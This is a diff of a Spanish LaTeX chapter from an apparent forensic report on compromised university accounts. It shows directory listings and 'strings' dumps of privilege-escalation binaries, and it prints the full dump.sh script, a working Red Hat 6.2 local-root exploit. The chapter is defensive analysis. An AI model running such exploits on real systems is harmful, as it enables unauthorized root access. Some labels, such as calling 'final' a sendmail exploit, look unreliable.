@@ -1,97 +1,582 @@
 \chapter{Análisis Forense de Cuentas Comprometidas}
 
-La seguridad de un sistema de cómputo multiusuario es tan sólida como el eslabón más débil de su cadena de credenciales. Cuando un atacante remoto logra adivinar o interceptar la contraseña de una cuenta legítima, no requiere explotar complejas vulnerabilidades de corrupción de memoria (\textit{buffer overflows}) para ingresar al servidor: entra por la puerta principal amparado por los privilegios asignados al usuario.
+La seguridad de un sistema de cómputo multiusuario es tan sólida como el eslabón más débil de su cadena de credenciales. El análisis forense de los directorios personales de los usuarios afectados reveló el mecanismo de acceso inicial y el depósito de herramientas auxiliares que permitieron la consolidación de la presencia no autorizada.
 
-En este capítulo se expone la inspección pericial del perfil del usuario \texttt{proa} (UID 523), la cuenta utilizada como vector de penetración inicial y depósito logístico del arsenal de herramientas del atacante.
+\section{Inspección Forense de Directorios de Cuentas Comprometidas}
 
-\section{El Depósito Clandestino en el Perfil de proa}
+ Contenido resumido del directorio proa:
 
-Tal como se constató en las bitácoras de transferencia FTP analizadas en el Capítulo 9, la cuenta \texttt{proa} fue utilizada para introducir los paquetes de código fuente malicioso en el servidor. Al inspeccionar el contenido del directorio personal \texttt{/home/proa}, el equipo pericial halló un inventario extraordinario de artefactos ofensivos, resumido en el Listado~\ref{lst:proa_home_curated}.
-
-\begin{lstlisting}[style=terminal,caption={Extracto representativo del inventario de artefactos hallados en /home/proa.},label={lst:proa_home_curated}]
-drwxr-xr-x 10 523      523         4096 Apr 16 22:16 ...
-drwxr-xr-x  3 523      523         4096 Apr 16 21:33 .king
-drwx------  4 523      523         4096 Apr 15 22:20 emech-2.8.3
-drwxr-xr-x  8 523      523         4096 Apr 12 05:33 psybnc
--rw-------  1 523      523          404 Apr  9 20:19 .bash_history
--rw-r--r--  1 523      523       200419 Apr 20 00:00 EriN[ca].seen
--rw-r--r--  1 523      523       184395 Apr 20 00:00 victima2.seen
--rw-r--r--  1 523      523          143 Apr 20 00:00 bot.users
--rwxr-xr-x  1 523      523       466184 Apr 15 23:39 in.ftpd
--rw-r-----  1 523      523        37210 Apr 16 10:01 passwd
--rw-r--r--  1 523      523       970089 Oct 28  2000 psyBNC2.2.1-linux-i86-static.tar.gz
--rw-r--r--  1 523      523      1546240 Feb 13 10:13 psyBNC2.3.1.tar
--rw-r--r--  1 523      523           77 Mar  9 23:40 psybnc.conf
+\vspace{1em}
+\vspace{0.8em}\hrulefill\vspace{0.8em}
+\begin{lstlisting}[style=terminal]
+?drwxr-xr-x 10 523      523         4096 Apr 16 22:16 ...                                                                                    ?
+?drwxr-xr-x  3 523      523         4096 Apr 16 21:33 .king                                                                                  ?
+?drwx------  4 523      523         4096 Apr 15 22:20 emech-2.8.3                                                                            ?
+?drwx------  2 523      523         4096 Feb  8  2002 ex                                                                                     ?
+?drwxr-xr-x  3 523      523         4096 Apr  9 20:25 king                                                                                   ?
+?drwxr-xr-x  2 523      523         4096 Jan 15  2001 proa                                                                                   ?
+?drwxr-xr-x  8 523      523         4096 Apr 12 05:33 psybnc                                                                                 ?
+?-rw-------  1 523      523          404 Apr  9 20:19 .bash_history                                                                          ?
+?-rw-r--r--  1 523      523           24 Jan 15  2001 .bash_logout                                                                           ?
+?-rw-r--r--  1 523      523          230 Jan 15  2001 .bash_profile                                                                          ?
+?-rw-r--r--  1 523      523          124 Jan 15  2001 .bashrc                                                                                ?
+?-rw-r--r--  1 523      523       200419 Apr 20 00:00 EriN[ca].seen                                                                          ?
+?-rw-r--r--  1 523      523       184395 Apr 20 00:00 victima2`.seen                                                                            ?
+?-rw-r--r--  1 523      523          269 Apr 18 20:57 LinkEvents                                                                             ?
+?-rw-r--r--  1 523      523       134211 Apr 10 23:56 Xeta.gz                                                                                ?
+?-rw-r--r--  1 523      523          143 Apr 20 00:00 bot.users                                                                              ?
+?-rw-r--r--  1 523      523        61440 Mar 15 23:40 ex.tar                                                                                 ?
+?-rwxr-xr-x  1 523      523       466184 Apr 15 23:39 in.ftpd                                                                                ?
+?-rw-r--r--  1 523      523           67 Jan 15  2001 introcd1.ram                                                                           ?
+?-rw-r--r--  1 523      523           67 Jan 15  2001 introcd2.ram                                                                           ?
+?-rw-r--r--  1 523      523           56 Jan 15  2001 martin990909.cgi                                                                       ?
+?-rw-r--r--  1 523      523         1054 Apr 20 00:00 mech.levels                                                                            ?
+?-rw-------  1 523      523            5 Apr 16 20:51 mech.pid
+?-rw-r--r--  1 523      523          448 Apr 20 00:00 mech.session                                                                           ?
+?-rw-r--r--  1 523      523         3989 Apr 11 21:37 mech.set                                                                               ?
+?-rw-r--r--  1 523      523       174080 Dec  5  2002 o0o.tar                                                                                ?
+?-rw-r--r--  1 523      523          916 Apr 16 23:10 pEpE[mx].seen                                                                          ?
+?-rw-r-----  1 523      523        37210 Apr 16 10:01 passwd                                                                                 ?
+?-rw-r--r--  1 523      523       970089 Oct 28  2000 psyBNC2.2.1-linux-i86-static.tar.gz                                                    ?
+?-rw-r--r--  1 523      523       200679 Nov  5  2000 psyBNC2.2.1.tar.gz                                                                     ?
+?-rw-r--r--  1 523      523       200798 Apr 14  2001 psyBNC2.2.2.tar.gz                                                                     ?
+?-rw-r--r--  1 523      523       200798 Apr 14  2001 psyBNC2.2.2.tar.gz.1                                                                   ?
+?-rw-r--r--  1 523      523      1546240 Feb 13 10:13 psyBNC2.3.1.tar                                                                        ?
+?-rw-r--r--  1 523      523       312188 Aug 17  2002 psyBNC2.3.1.tar.gz                                                                     ?
+?-rw-r--r--  1 523      523           77 Mar  9 23:40 psybnc.conf 
 \end{lstlisting}
+\vspace{0.8em}\hrulefill\vspace{0.8em}
+\vspace{1em} 
 
-\subsection{Categorización Pericial de los Objetos Descubiertos}
+ Contenido resumido del directorio zena:
+ 
+\vspace{1em}
+\vspace{0.8em}\hrulefill\vspace{0.8em}
+\begin{lstlisting}[style=terminal]
+?drwxr-xr-x  9 521      521         4096 Apr 23 19:59 psybnc                                                                                 ?
+?drwxr-xr-x  3 521      521         4096 Apr 21 20:22 zena                                                                                   ?
+?-rw-------  1 521      521          284 Apr 24 00:29 .bash_history                                                                          ?
+?-rw-r--r--  1 521      521           24 Jan 15  2001 .bash_logout                                                                           ?
+?-rw-r--r--  1 521      521          230 Jan 15  2001 .bash_profile                                                                          ?
+?-rw-r--r--  1 521      521          124 Jan 15  2001 .bashrc                                                                                ?
+?-rw-r--r--  1 521      521       200798 Mar 19 18:41 psyBNC2.2.2.tar.gz
+\end{lstlisting}
+\vspace{0.8em}\hrulefill\vspace{0.8em}
+\vspace{1em}
 
-El Cuadro~\ref{tab:analisis_proa} clasifica las herramientas localizadas en el perfil de acuerdo con su finalidad técnica.
+ Contenido resumido del directorio zopilote:
+ 
+\vspace{1em}
+\vspace{0.8em}\hrulefill\vspace{0.8em}
+\begin{lstlisting}[style=terminal]
+?drwxr-xr-x  5 1019     1019        4096 Apr  8 23:20 emech                                                                                  ?
+?drwx------  2 1019     1019        4096 Feb  8  2002 ex                                                                                     ?
+?drwxr-xr-x 10 1019     1019        4096 Mar 31 02:13 psybnc                                                                                 ?
+?-rw-------  1 1019     1019          74 Apr  4 21:24 .bash_history                                                                          ?
+?-rw-r--r--  1 1019     1019          24 Jan 15  2001 .bash_logout                                                                           ?
+?-rw-r--r--  1 1019     1019         230 Jan 15  2001 .bash_profile                                                                          ?
+?-rw-r--r--  1 1019     1019         124 Jan 15  2001 .bashrc                                                                                ?
+?-rw-r--r--  1 1019     1019       61440 Mar 31 00:06 ex.tar                                                                                 ?
+?-rw-r-----  1 1019     1019      178862 Jan 29 07:50 mech-linux.tar.gz                                                                      ?
+?-rw-r--r--  1 1019     1019     1546240 Mar 30 23:01 psyBNC2.3.1.tar
+\end{lstlisting}
+\vspace{0.8em}\hrulefill\vspace{0.8em}
+\vspace{1em}
 
-\begin{table}[htbp]
-\centering
-\small
-\begin{tabular}{lp{10cm}}
-\toprule
-\textbf{Categoría} & \textbf{Artefactos Hallados y Función Pericial} \\
-\midrule
-\textbf{Directorios Ocultos} & \texttt{...} (directorio de tres puntos) y \texttt{.king}. Estructuras camufladas para almacenar ejecutables y scripts de inicio automático. \\
-\addlinespace
-\textbf{Bots de Red IRC} & \texttt{emech-2.8.3} (\textit{EnergyMech}), \texttt{bot.users}, \texttt{EriN[ca].seen}, \texttt{victima2.seen}. Distribución completa del bot EnergyMech y bases de datos de seguimiento de nicks en canales IRC. \\
-\addlinespace
-\textbf{Bouncers (Proxies IRC)} & \texttt{psybnc}, versiones 2.2.1 y 2.3.1 en código fuente y paquetes estáticos precompilados, junto con el archivo de configuración activo \texttt{psybnc.conf}. \\
-\addlinespace
-\textbf{Servicios Clandestinos} & \texttt{in.ftpd}. Demonio de FTP independiente compilado para ejecutarse en puertos no estándar, permitiendo la carga y descarga de archivos eludiendo el servicio FTP oficial del sistema. \\
-\addlinespace
-\textbf{Sustracción de Credenciales} & \texttt{passwd} (archivo de 37.2~KB). Copia local del archivo de cuentas del sistema, sustraída para la ejecución de ataques de fuerza bruta locales (\textit{offline cracking}) con herramientas como \textit{John the Ripper}. \\
-\bottomrule
-\end{tabular}
-\caption{Clasificación funcional de las herramientas descubiertas en la cuenta proa.}
-\label{tab:analisis_proa}
-\end{table}
+ Contenido resumido del directorio lllll:
+ 
+\vspace{1em}
+\vspace{0.8em}\hrulefill\vspace{0.8em}
+\begin{lstlisting}[style=terminal]
+?drwxr-xr-x  3 1040     1040        4096 Apr 23 22:33 ...                                                                                    ?
+?drwx------  2 1040     1040        4096 Feb  8  2002 ex                                                                                     ?
+?-rw-------  1 1040     1040          51 Apr 23 22:30 .bash_history                                                                          ?
+?-rw-r--r--  1 1040     1040          24 Jan 15  2001 .bash_logout                                                                           ?
+?-rw-r--r--  1 1040     1040         230 Jan 15  2001 .bash_profile                                                                          ?
+?-rw-r--r--  1 1040     1040         124 Jan 15  2001 .bashrc                                                                                ?
+?-rw-r--r--  1 1040     1040         364 Jan 15  2001 dead.letter                                                                            ?
+?-rw-r--r--  1 1040     1040       61440 Apr 21 20:37 o0o.tar
+\end{lstlisting}
+\vspace{0.8em}\hrulefill\vspace{0.8em}
+\vspace{1em}
 
-\section{Técnicas de Ocultamiento: El Directorio «Tres Puntos» (\texttt{...})}
+Contenido resumido del directorio duende:
+ 
+\vspace{1em}
+\vspace{0.8em}\hrulefill\vspace{0.8em}
+\begin{lstlisting}[style=terminal]
+?-rw-r--r--  1 500      500       174080 Dec  5  2002 o0o.tar                                                                                ?
+?-rw-r--r--  1 500      500          707 May  8  2001 dump.sh
+\end{lstlisting}
+\vspace{0.8em}\hrulefill\vspace{0.8em}
+\vspace{1em}
 
-Uno de los mecanismos de camuflaje más antiguos y extendidos en la cultura del \textit{cracking} sobre sistemas Unix fue el uso de directorios denominados literalmente \texttt{...} (tres puntos consecutivos).
 
-En los sistemas de archivos compatibles con POSIX, el comando \texttt{ls -a} muestra obligatoriamente las entradas especiales \texttt{.} (directorio actual) y \texttt{..} (directorio padre). Al crear un subdirectorio nombrado con tres puntos (\texttt{mkdir ...}):
-\begin{itemize}
-    \item En listados apresurados, el ojo del administrador tiende a confundir la entrada \texttt{...} con los metadirectorios estándar del sistema.
-    \item Los scripts de limpieza basados en expresiones regulares simples o que filtran directorios que comienzan con punto pueden omitir o manejar erróneamente esta ruta.
-\end{itemize}
+ Los archivo oOo.tar se repiten en varios de los directorios. El contenido de este paquete es:
+ 
+\vspace{1em}
+\vspace{0.8em}\hrulefill\vspace{0.8em}
+\begin{lstlisting}[style=terminal]
+drwx------ scott/users       0 2002-02-08 07:09:51 ex/
+-rwx------ scott/users   14361 2002-02-08 07:09:35 ex/ep
+-rwx------ scott/users   14543 2002-02-08 07:09:39 ex/rh
+-rwx------ scott/users   23577 2002-02-08 07:09:45 ex/sd
+\end{lstlisting}
+\vspace{0.8em}\hrulefill\vspace{0.8em}
+\vspace{1em}
 
-La inspección del subdirectorio \texttt{/home/proa/...} confirmó que operaba como el centro neurálgico del bot \textit{EnergyMech}, conteniendo sus ejecutables principales, registros de conexión y scripts en shell para reiniciar el proceso de forma persistente cada vez que el sistema se reiniciaba.
+ Estos paquetes contienen ejecutables dentro de un directorio llamado
+ \texttt{ex/}. Verifiquemos la función de estos programas:
+ 
+\vspace{1em}
+\vspace{0.8em}\hrulefill\vspace{0.8em}
+\begin{lstlisting}[style=terminal]
+ep: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), 
+	not stripped
+rh: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), 
+	not stripped
+sd: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), 
+	not stripped
+\end{lstlisting}
+\vspace{0.8em}\hrulefill\vspace{0.8em}
+\vspace{1em}
 
-\section{Disección del Bot EnergyMech (emech-2.8.3)}
+\texttt{ex/ep}
 
-\textit{EnergyMech} representó una de las evoluciones más avanzadas en la programación de bots para IRC en C durante las décadas de 1990 y 2000. A diferencia de los clientes tradicionales, incorporaba soporte nativo para:
-\begin{itemize}
-    \item \textbf{Gestión jerárquica de usuarios (\texttt{bot.users} y \texttt{mech.levels}):} Permitía asignar niveles de mando (maestro, administrador, operador) a los usuarios remotos que enviaran comandos autenticados a través de mensajes privados en IRC.
-    \item \textbf{Bases de datos de presencia (\texttt{.seen}):} Los archivos \texttt{EriN[ca].seen} y \texttt{victima2.seen} almacenaban el registro de todas las personas que entraban y salían de los canales de chat monitoreados por el bot, guardando su máscara de host, fecha y último mensaje emitido.
-    \item \textbf{Capacidades ofensivas integradas:} Módulos de ataque para saturación de canales mediante envío masivo de mensajes (\textit{flooding}) y desestabilización de clientes mediante cadenas maliciosas.
-\end{itemize}
 
-\section{Exfiltración Local de Credenciales: El Archivo passwd}
+\vspace{1em}
+\vspace{0.8em}\hrulefill\vspace{0.8em}
+\begin{lstlisting}[style=terminal]
+/lib/ld-linux.so.2
+__gmon_start__
+libc.so.6
+waitpid
+snprintf
+execl
+perror
+readlink
+fprintf
+kill
+__deregister_frame_info
+signal
+fork
+getppid
+ptrace
+strcmp
+stderr
+exit
+_IO_stdin_used
+__libc_start_main
+strlen
+__register_frame_info
+GLIBC_2.0
+PTRh
+QVhD
+execl
+/proc/%i/exe
+readlink
+child slept outside of execve
+/usr/bin/passwd
+fork: victim
+ptrace: PTRACE_ATTACH
+ptrace: PTRACE_CONT
+ptrace: PTRACE_GETREGS
+ptrace: PTRACE_POKETEXT
+ptrace: PTRACE_SETREGS
+bug exploited successfully.
+enjoy!
+ptrace: PTRACE_DETACH
+d0h! error!
+/bin/sh
+\end{lstlisting}
+\vspace{0.8em}\hrulefill\vspace{0.8em}
+\vspace{1em}
 
-El hallazgo de un archivo de 37,210 bytes titulado \texttt{/home/proa/passwd} aportó una prueba crítica sobre las intenciones del intruso. Al cotejar su contenido con el archivo original \texttt{/etc/passwd} del servidor, se comprobó que se trataba de una réplica íntegra de la base de usuarios de la universidad.
+\texttt{ex/rh}
 
-En los sistemas Unix configurados con contraseñas ocultas (\textit{shadow passwords}), las cadenas hash cifradas residen exclusivamente en \texttt{/etc/shadow}, un archivo con permisos de lectura reservados al superusuario (\texttt{0400} de \texttt{root}). Sin embargo, la copia hallada en el directorio de \texttt{proa} contenía las entradas completas de nombres de usuario, directorios personales, intérpretes de comandos asignados y números de identificación (UID/GID). 
+\vspace{1em}
+\vspace{0.8em}\hrulefill\vspace{0.8em}
+\begin{lstlisting}[style=terminal] 
+/lib/ld-linux.so.2
+__gmon_start__
+libc.so.6
+waitpid
+ioctl
+execl
+perror
+dup2
+sleep
+pipe
+fprintf
+__deregister_frame_info
+read
+setenv
+fork
+ptrace
+sprintf
+stderr
+exit
+atoi
+_IO_stdin_used
+__libc_start_main
+strlen
+__register_frame_info
+close
+GLIBC_2.0
+PTRh
+read:
+/usr/bin/passwd
+execl
+exec %s %i
+PTRACE_GETREGS
+waitpid
+fork
+attach
+cont
+attached
+read
+libs
+LD_DEBUG
+/usr/bin/newgrp
+Rhn/shh//bi
+\end{lstlisting}
+\vspace{0.8em}\hrulefill\vspace{0.8em}
+\vspace{1em}
 
-Esta información suministró al atacante el mapa completo de usuarios del centro de cómputo, facilitándole la selección de cuentas candidatas para ejecutar ataques de diccionario dirigidos.
+\texttt{ex/sd}
 
-\section{Vectores de Débil Autenticación y Factores Sistémicos}
+\vspace{1em}
+\vspace{0.8em}\hrulefill\vspace{0.8em}
+\begin{lstlisting}[style=terminal]
+/lib/ld-linux.so.2
+__gmon_start__
+libc.so.6
+strcpy
+printf
+stdout
+execve
+fscanf
+fgets
+execl
+pclose
+perror
+dup2
+system
+optarg
+fflush
+popen
+fprintf
+kill
+strcat
+__deregister_frame_info
+chdir
+wait
+setgid
+signal
+setenv
+fork
+sscanf
+getopt
+memset
+getppid
+getcwd
+sprintf
+fclose
+access
+exit
+fopen
+_IO_stdin_used
+__libc_start_main
+strlen
+setuid
+mkdir
+__register_frame_info
+close
+__xstat
+GLIBC_2.1
+GLIBC_2.0
+PTRh
+QVhT
+/bin/rm -rf %s > /dev/null 2> /dev/null
+EGG=
+%u-%u.%u-
+%s [command] [options]
+-h     this help
+-d     specify depth of analysis (default=32)
+-o     change offset (default = -32000)
+-v     specify victim (default /usr/sbin/sendmail)
+-t     specify temp directory (default /tmp/.sxp)
+-b      enables bruteforce (WARNING: this may take about 20-30 minutes!)
+/usr/sbin/sendmail
+Voila babe, entering rootshell!
+Enjoy!
+/usr/bin/id
+/dev/null
+BASH_HISTORY
+-bash
+/bin/bash
+...-=[ Sendmail 8.11.x exploit, (c)oded by sd@sf.cz [sd@ircnet], 2001 ]=-...
+      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+hd:o:v:t:b
+[*] Using brute force, this may take some time
+%s%s/%s
+[*] Victim = %s
+[*] Depth  = %d
+[*] Offset = %d
+[*] Temp   = %s
+[*] ESP    = 0x%08x
+[-] Bad: %s isn't suid ;(
+[-] Bad: We haven't access to %s !
+[-] Can't create our tempdir!
+[+] Created %s
+objdump
+%s -R %s | grep setuid
+[-] Cannot get setuid() GOT
+[+] Step 1. setuid() got = 0x%08x
+%s/sm
+[*] Step 2. Copying %s to %s...
+/bin/cp -f %s %s
+Failed
+[*] Step 3. Disassembling %s...
+grep
+%s -d %s 2> /dev/null | %s -B %d "mov.*%%.l,(%%e..,%%e..,1)" | %s ".mov .*0x80.*,%%e.."
+%s -d %s 2> /dev/null | %s ".mov .*0x80.*,%%e.."
+%x: %s %s %s %s %s %s 0x%x,%s
+/usr/bin/id
+/dev/null
+BASH_HISTORY
+-bash
+/bin/bash
+...-=[ Sendmail 8.11.x exploit, (c)oded by sd@sf.cz [sd@ircnet], 2001 ]=-...
+      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+hd:o:v:t:b
+[*] Using brute force, this may take some time
+%s%s/%s
+[*] Victim = %s
+[*] Depth  = %d
+[*] Offset = %d
+[*] Temp   = %s
+[*] ESP    = 0x%08x
+[-] Bad: %s isn't suid ;(
+[-] Bad: We haven't access to %s !
+[-] Can't create our tempdir!
+[+] Created %s
+objdump
+%s -R %s | grep setuid
+[-] Cannot get setuid() GOT
+[+] Step 1. setuid() got = 0x%08x
+%s/sm
+[*] Step 2. Copying %s to %s...
+/bin/cp -f %s %s
+Failed
+[*] Step 3. Disassembling %s...
+grep
+%s -d %s 2> /dev/null | %s -B %d "mov.*%%.l,(%%e..,%%e..,1)" | %s ".mov .*0x80.*,%%e.."
+%s -d %s 2> /dev/null | %s ".mov .*0x80.*,%%e.."
+%x: %s %s %s %s %s %s 0x%x,%s
+OK, found %d targets
+[*] Step 4. Exploiting %d targets:
+%s/gdb
+Cannot create gdb script
+break *0x%x
+r -d1-1.1
+x/x 0x%x
+%s -batch -x %s %s 2> /dev/null
+Failed to spawn gdb!
+0x%x %s 0x%x
+[%d] (%d%% of targets) GOT=0x%08x, VECT=0x%08x, offset=%d
+Thanx for choosing sd's products ;)
+[-] All targets failed, probably not vulnerable ;(
+/usr/sbin/sendmail
+/tmp/.sxp
+\end{lstlisting}
+\vspace{0.8em}\hrulefill\vspace{0.8em}
+\vspace{1em}
 
-La investigación forense de las cuentas afectadas permitió identificar las causas estructurales que hicieron posible el compromiso:
-\begin{enumerate}
-    \item \textbf{Contraseñas triviales:} La cuenta \texttt{proa} utilizaba una contraseña idéntica al propio nombre de usuario o constituida por palabras del diccionario español sin números ni caracteres especiales, vulnerable a ser descubierta en cuestión de segundos mediante escaneos de fuerza bruta automatizados sobre el puerto 21 (FTP).
-    \item \textbf{Ausencia de políticas de bloqueo de cuentas:} En la configuración de red de 2004, los servicios no limitaban el número de intentos fallidos consecutivos ni existían sistemas de baneo automático de direcciones IP como \textit{Fail2ban}.
-    \item \textbf{Protocolos en texto claro:} La provisión de servicios sin cifrado (FTP en puerto 21 y Telnet en puerto 23) facilitó que las credenciales fueran interceptadas en tránsito cada vez que los usuarios legítimos iniciaban sesión desde terminales externas.
-\end{enumerate}
+ Estos programas explotan vulnerabilidades del servidor de correo y
+sirven para ganar acceso a root desde una cuenta no privilegiada. En
+al última línea de \texttt{ex/sd} se hace referencia a \texttt{/tmp/.sxp} que es uno de
+los programas que se encontró en el historial de duende como utilizado
+por el.\\
 
-\section{Conclusiones del Análisis de Cuentas}
+ La revisión detallada de los archivos en el directorio de \texttt{duende} confirmó la replicación del mismo material ofensivo:
+ 
 
-El examen forense del perfil \texttt{proa} demostró que:
-\begin{itemize}
-    \item La cuenta no fue creada por el intruso, sino que pertenecía a un usuario legítimo cuya clave fue vulnerada desde el exterior.
-    \item La cuenta funcionó como la base logística y depósito de almacenamiento (\textit{drop zone}) donde se compilaron y ejecutaron los servicios de IRC y bouncers antes de que el ataque secundario escalara a nivel de superusuario.
-\end{itemize}
+\texttt{oOo.tar}
+
+\vspace{1em}
+\vspace{0.8em}\hrulefill\vspace{0.8em}
+\begin{lstlisting}[style=terminal]
+?-rw-------  1 root     root        2086 Dec  5  2002 S8EXP                                                                                  ?
+?-rwxr-xr-x  1 root     root        9320 Nov  7  2002 final                                                                                  ?
+?-rw-------  1 root     root        2987 Dec  5  2002 final.c                                                                                ?
+?-rw-------  1 root     root        1947 Dec  5  2002 flkm.c                                                                                 ?
+?-rw-r--r--  1 root     root       78450 Nov  7  2002 flkm32                                                                                 ?
+?-rw-r--r--  1 root     root       68352 Nov  7  2002 flkm64
+\end{lstlisting}
+\vspace{0.8em}\hrulefill\vspace{0.8em}
+\vspace{1em}
+ 
+ Este es idénticamente el mismo que el oOo.tar que esta en el
+ directorio proa.\\
+
+
+ Contenido del archivo llamado \texttt{final}:
+ 
+
+\vspace{1em}
+\vspace{0.8em}\hrulefill\vspace{0.8em}
+\begin{lstlisting}[style=terminal]
+ /usr/lib/ld.so.1
+system
+_GLOBAL_OFFSET_TABLE_
+_init
+printf
+_edata
+exit
+getpppid
+environ
+getpid
+close
+_Jv_RegisterClasses
+_PROCEDURE_LINKAGE_TABLE_
+_DYNAMIC
+__dso_handle
+strcpy
+sprintf
+_start
+write
+getuid
+atexit
+_environ
+execl
+mkdir
+open
+_etext
+__priocntl
+memset
+main
+__register_frame_info
+atoi
+__deregister_frame_info
+free
+_end
+malloc
+read
+_lib_version
+lseek
+_fini
+_exit
+Load
+libc.so.1
+SUNW_0.7
+libc.so.1
+/proc/%d/psinfo
+../../../tmp/flkm32
+../../../tmp/flkm64
+is 64 bit: %d
+cp -f flkm32 /tmp/flkm32
+/tmp/sparcv9
+cp -f flkm64 /tmp/sparcv9/flkm64
+/tmp/flkm32
+/tmp/sparcv9/flkm64
+%d bytes to write
+%d bytes wroten
+err! open flkm error!
+id=%d
+rm -fr /tmp/flkm32
+rm -fr /tmp/sparcv9
+SUCCESS! Enjoy RootShell!
+/bin/sh
+fail!
+\end{lstlisting}
+\vspace{0.8em}\hrulefill\vspace{0.8em}
+\vspace{1em}
+
+ Este es el contenido de un \textit{exploit} de sendmail.\\
+ 
+ 
+ Contenido de \texttt{dump.sh}:
+
+\vspace{1em}
+\vspace{0.8em}\hrulefill\vspace{0.8em}
+\begin{lstlisting}[style=terminal] 
+#!/bin/sh
+
+# Redhat 6.2 dump command executes external program
+# with suid priviledge.
+# Discovered by Mat <mat@hacksware.com>
+# Written for and by a scriptkid Tasc ;P
+# Remember, there's no cure for BSE
+
+echo "dump-0.4b15 root exploit"
+echo "Discovered by Mat <mat@hacksware.com>"
+echo "-------------------------------------"
+echo
+DUMP=/sbin/dump
+if [ ! -u $DUMP ]; then
+  echo "$DUMP is NOT setuid on this system or does not exist at all!"
+  echo
+  exit 0
+fi
+export TAPE=iamlame:iamlame
+export RSH=/tmp/rsh
+cat >/tmp/rsh <<__eof__
+#!/bin/sh
+cp /bin/sh /tmp/sush
+chmod 4755 /tmp/sush
+}
+__eof__
+chmod 755 /tmp/rsh
+/sbin/dump -0 /
+echo
+echo "Waiting for rootshell .... 5 seconds...."
+sleep 5
+/tmp/sush
+id
+\end{lstlisting}
+\vspace{0.8em}\hrulefill\vspace{0.8em}
+\vspace{1em}
+
+ Es el contenido de un \textit{script} que da acceso a un \textbf{shell} de root de
+ forma no autorizada.\\
+ 
+
+ Los directorios y archivos \texttt{emech}, \texttt{psybnc} y \texttt{eggdrop} son de paquetes
+que ejecutan un servidor de \textbf{IRC} y contienen servidores de \texttt{FTP} y
+\texttt{telnet}. El contenido de estos directorios es el siguiente:
+
+\vspace{1em}
+\vspace{0.8em}\hrulefill\vspace{0.8em}
+\begin{lstlisting}[style=terminal]
+drwxr-xr-x  3 1040     1040        4096 Apr 23 22:33 ..                                                                                     ?
+?drwxr-xr-x  2 1040     1040        4096 Oct 21  2000 help                                                                                   ?
+?drwxr-xr-x  2 1040     1040        4096 Apr 23 22:34 log                                                                                    ?
+?drwxr-xr-x  3 1040     1040        4096 Oct 21  2000 menuconf                                                                               ?
+?drwxr-xr-x  2 1040     1040        4096 Apr 23 22:42 motd                                                                                   ?
+?drwxr-xr-x  3 1040     1040        4096 Jul 30  2000 scripts                                                                                ?
+?drwxr-xr-x  2 1040     1040        4096 Oct 21  2000 tools                                                                                  ?
+?-rw-r--r--  1 1040     1040       18124 Oct 28  2000 CHANGES                                                                                ?
+?-rw-------  1 1040     1040       17982 May 16  1997 COPYING                                                                                ?
+?-rw-r--r--  1 1040     1040        2660 Aug  8  2000 FAQ                                                                                    ?
+?-rw-r--r--  1 1040     1040         394 Oct 28  2000 Makefile                                                                               ?
+?-rw-r--r--  1 1040     1040       36075 Oct 28  2000 README                                                                                 ?
+?-rw-r--r--  1 1040     1040          76 Oct 28  2000 TODO                                                                                   ?
+?-rwxr-xr-x  1 1040     1040      537712 Apr 23 22:33 in.ftpd                                                                                ?
+?-rw-------  1 1040     1040         716 Apr 23 22:42 psybnc.conf                                                                            ?
+?-rw-------  1 1040     1040         716 Apr 23 22:42 psybnc.conf.old                                                                        ?
+?-rw-------  1 1040     1040           7 Apr 23 22:33 psybnc.pid                                                                             ?
+?-rwxr-xr-x  1 1040     1040         369 Aug  8  2000 psybncchk
+\end{lstlisting}
+\vspace{0.8em}\hrulefill\vspace{0.8em}
+\vspace{1em}
+
+ El objeto de estos programas es ofrecer el servicio de charlas en línea \textbf{IRC} para la red
+\textbf{UNDERnet}. El sembrar estos servidores es una actividad extremadamente común, 
+y generalmente quienes la realizan no buscan controlar el sistema u obtener
+información privada como en este caso, solo usan las máquinas para
+colocar sus servidores y después de poco tiempo migran a otros equipos
+sin dejar rastro o recolectar información. No serán estudiados
+estos servicios en el presente reporte, solo se mencionará lo que sea de interés
+directo con la intrusión y sustracción de información confidencial.
+
